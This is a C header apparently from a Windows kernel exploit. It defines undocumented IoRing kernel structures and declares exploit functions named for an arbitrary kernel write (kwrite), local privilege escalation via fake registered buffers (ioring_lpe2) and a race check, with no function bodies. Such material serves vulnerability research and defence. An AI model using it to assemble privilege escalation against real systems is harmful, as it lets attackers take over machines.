#ifndef _IORING_H_
#define _IORING_H_

#include "win_defs.h"

typedef struct _NT_IORING_CREATE_FLAGS
{
    enum _NT_IORING_CREATE_REQUIRED_FLAGS Required;
    enum _NT_IORING_CREATE_ADVISORY_FLAGS Advisory;
} NT_IORING_CREATE_FLAGS, * PNT_IORING_CREATE_FLAGS;

typedef struct _NT_IORING_INFO
{
    enum IORING_VERSION IoRingVersion;
    struct _NT_IORING_CREATE_FLAGS Flags;
    unsigned int SubmissionQueueSize;
    unsigned int SubmissionQueueRingMask;
    unsigned int CompletionQueueSize;
    unsigned int CompletionQueueRingMask;
    struct _NT_IORING_SUBMISSION_QUEUE* SubmissionQueue;
    struct _NT_IORING_COMPLETION_QUEUE* CompletionQueue;
} NT_IORING_INFO, * PNT_IORING_INFO;

typedef struct _IOP_MC_BUFFER_ENTRY
{
    USHORT Type;
    USHORT Reserved;
    ULONG Size;
    ULONG ReferenceCount;
    ULONG Flags;
    LIST_ENTRY GlobalDataLink;
    PVOID Address;
    ULONG Length;
    CHAR AccessMode;
    ULONG MdlRef;
    struct _MDL* Mdl;
    KEVENT MdlRundownEvent;
    PULONG64 PfnArray;
    BYTE PageNodes[0x20];
} IOP_MC_BUFFER_ENTRY, * PIOP_MC_BUFFER_ENTRY;

typedef struct _IORING_OBJECT
{
    short Type;
    short Size;
    struct _NT_IORING_INFO UserInfo;
    void* Section;
    struct _NT_IORING_SUBMISSION_QUEUE* SubmissionQueue;
    struct _MDL* CompletionQueueMdl;
    struct _NT_IORING_COMPLETION_QUEUE* CompletionQueue;
    unsigned __int64 ViewSize;
    long InSubmit;
    unsigned __int64 CompletionLock;
    unsigned __int64 SubmitCount;
    unsigned __int64 CompletionCount;
    unsigned __int64 CompletionWaitUntil;
    struct _KEVENT CompletionEvent;
    unsigned char SignalCompletionEvent;
    struct _KEVENT* CompletionUserEvent;
    unsigned int RegBuffersCount;
    struct _IOP_MC_BUFFER_ENTRY** RegBuffers;
    unsigned int RegFilesCount;
    void** RegFiles;
} IORING_OBJECT, * PIORING_OBJECT;

typedef struct _HIORING
{
    HANDLE handle;
    NT_IORING_INFO Info;
    ULONG IoRingKernelAcceptedVersion;
    PVOID RegBufferArray;
    ULONG BufferArraySize;
    PVOID Unknown;
    ULONG FileHandlesCount;
    ULONG SubQueueHead;
    ULONG SubQueueTail;
}_HIORING;

int ioring_setup(PIORING_OBJECT* ppIoRingAddr);
void kwrite(UINT64 addr, PVOID data, SIZE_T size);
int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, DWORD dwFakeRegBufferCnt, UINT64 ioring_addr);
int map_region();
int race_succeeded(ULONG ulFakeRegBufferCnt, UINT64 ioring_addr);

#endif